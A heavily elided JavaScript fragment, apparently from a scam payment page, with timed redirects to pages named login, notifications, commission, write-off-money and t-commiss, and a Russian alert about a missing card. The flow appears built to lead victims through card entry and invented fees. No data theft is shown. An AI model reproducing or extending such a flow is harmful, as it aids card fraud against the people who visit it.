...
function page1(){
	...
	setTimeout(function(){location.replace("login.php");},1000);
}
function page2(){
 $('#loadpage').html('<div class="bganim"><center><br><br><img class="loader" src="loadcard.svg"><br></center></div>');
	setTimeout(function(){location.replace("notifications.php");},3000);
}
function page3(){	
		...
		setTimeout(function(){location.replace("commission.php");},11000);
...
function page4(){	
		...
		setTimeout(function(){$('#status1').fadeOut(1);},6000); 
		setTimeout(function(){$('#status2').fadeIn(2); },6000); 
		setTimeout(function(){location.replace("write-off-money.php");},11000);
...
alert("Вы не указали карту!");
	...
	mpay1();
		...
		setTimeout(function(){location.replace("t-commiss.php");},19000);
